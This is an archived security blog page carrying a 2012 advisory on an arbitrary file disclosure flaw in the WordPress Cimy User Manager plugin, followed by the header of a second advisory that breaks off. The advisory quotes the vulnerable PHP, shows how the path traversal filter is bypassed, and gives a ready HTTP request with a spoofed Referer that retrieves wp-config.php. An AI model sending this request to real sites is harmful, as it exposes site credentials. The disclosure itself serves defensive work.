<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="https://charlieeriksen.github.io" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>ceriksen.com | Page 3</title>

<link rel="stylesheet" type="text/css" media="all" href="https://charlieeriksen.github.io/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->


<link rel='stylesheet' id='crayon-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="home blog paged paged-3  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="https://charlieeriksen.github.io/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="https://charlieeriksen.github.io/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="https://charlieeriksen.github.io/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<div id="primary">
			<div id="content" role="main">

			
					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="https://charlieeriksen.github.io/page/4/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						<div class="nav-next"><a href="https://charlieeriksen.github.io/page/2/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
						
		
	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-160" class="post-160 post type-post status-publish format-standard hentry category-advisories tag-cimy-user-manager tag-file-disclosure tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/" title="10:49 am" rel="bookmark" class="entry-date"><time datetime="2012-10-24T10:49:53+00:00" pubdate>October 24, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/" title="Permalink to WordPress Cimy User Manager arbitrary file disclosure" rel="bookmark">WordPress Cimy User Manager arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50834/">Secunia Advisory SA 50834</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The Cimy User Manager is made to be able to export data from WordPress. The file <a href="http://plugins.svn.wordpress.org/cimy-user-manager/tags/1.4.1/cimy_user_manager.php">cimy_user_manager.php</a> has an init action which decides whether or not to download some content from the site:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa112c981567928" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_action('init', 'cimy_um_download_database');

function cimy_um_download_database() {
	if (!empty($_POST["cimy_um_filename"])) {
		if (strpos($_SERVER['HTTP_REFERER'], admin_url('users.php?page=cimy_user_manager')) !== false) {
			$cimy_um_filename = $_POST["cimy_um_filename"];
			// protect from site traversing
			$cimy_um_filename = str_replace('../', '', $cimy_um_filename);
			if (!is_file($cimy_um_filename))
				return;

			header("Pragma: "); // Leave blank for issues with IE
			header("Expires: 0");
			header('Vary: User-Agent');
			header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
			header("Content-Type: text/csv");
			header("Content-Type: application/force-download");
			header("Content-Type: application/download");
			header("Content-Disposition: attachment; filename=\"".esc_html(basename($cimy_um_filename))."\";"); // cannot use esc_url any more because prepends 'http' (doh)
			header("Content-Transfer-Encoding: binary");
			header("Content-Length: ".filesize($cimy_um_filename));
			readfile($cimy_um_filename);
			exit();
		}
	}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-72">72</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-74">74</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-76">76</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-78">78</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-80">80</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-82">82</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-84">84</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-86">86</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-87">87</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-88">88</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-89">89</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-90">90</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-91">91</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-92">92</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-93">93</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-94">94</div><div class="crayon-num" data-line="crayon-53c98e7aa112c981567928-95">95</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa112c981567928-96">96</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa112c981567928-71"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'cimy_um_download_database'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-72">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-73"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">cimy_um_download_database</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-k ">empty</span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"cimy_um_filename"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-v">$_SERVER</span><span class="crayon-sy">[</span><span class="crayon-s">'HTTP_REFERER'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">admin_url</span><span class="crayon-sy">(</span><span class="crayon-s">'users.php?page=cimy_user_manager'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!==</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"cimy_um_filename"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-77"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// protect from site traversing</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-78"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">'../'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-79"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">is_file</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-80"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-81">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-82"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Pragma: "</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// Leave blank for issues with IE</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-83"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Expires: 0"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-84"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Vary: User-Agent'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-85"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Cache-Control: must-revalidate, post-check=0, pre-check=0"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-86"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: text/csv"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-87"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: application/force-download"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-88"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: application/download"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-89"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Disposition: attachment; filename=\""</span><span class="crayon-sy">.</span><span class="crayon-e">esc_html</span><span class="crayon-sy">(</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"\";"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// cannot use esc_url any more because prepends 'http' (doh)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-90"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Transfer-Encoding: binary"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-91"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Length: "</span><span class="crayon-sy">.</span><span class="crayon-e">filesize</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-92"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-93"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-94"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa112c981567928-95"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa112c981567928-96"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0161 seconds] -->
<p>First it checks if the cimy_um_filename POST variable is set. Then it goes to check if the referer is from the admin page, which is a flawed way of authentication. But if it thinks you come from the admin page, it will attempt to protect against path traversal. It is pretty obvious that we can fake the referer header. But we can quite easily bypass the path traversal. Lets have a look at an example.</p>
<p>Take this string: &#8230;/&#8230;//<br />
Now lets see where we match ../:  .<span style="color: #ff0000;">../</span>.<span style="color: #ff0000;">../</span>/<br />
Which leaves us with: ../</p>
<p>This tells us that the path traversal &#8220;protection&#8221; on line 78 can be bypassed trivially.</p>
<p>Additionally, in the case where you&#8217;d want to obtain a wp-config.php file, which contains credentials and other very critical information about the blog, we do not need to bypass this, because when init is called, the working directory is the wordpress base folder, which contains the wp-config.php file. Here&#8217;s an example request showing how to pull the wp-config.php file:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa114c275577641" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/ HTTP/1.0
Host: 192.168.80.130
Referer: http://192.168.80.130/wordpress/wp-admin/users.php?page=cimy_user_manager
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

cimy_um_filename=wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa114c275577641-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa114c275577641-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa114c275577641-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa114c275577641-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa114c275577641-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa114c275577641-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa114c275577641-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa114c275577641-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa114c275577641-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e7aa114c275577641-3"><span class="crayon-i">Referer</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/wp-admin/users.php?page=cimy_user_manager</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa114c275577641-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c98e7aa114c275577641-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">30</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa114c275577641-6">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa114c275577641-7"><span class="crayon-v">cimy_um_filename</span><span class="crayon-o">=</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-i">php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0030 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/cimy-user-manager/" rel="tag">Cimy User Manager</a>, <a href="https://charlieeriksen.github.io/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/#respond" title="Comment on WordPress Cimy User Manager arbitrary file disclosure">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-160 -->

				
					
<article id="post-176" class="post-176 post type-post status-publish format-standard hentry category-advisories tag-command-injection tag-ungallery tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/" title="7:06 pm" rel="bookmark" class="entry-date"><time datetime="2012-10-23T19:06:10+00:00" pubdate>October 23, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
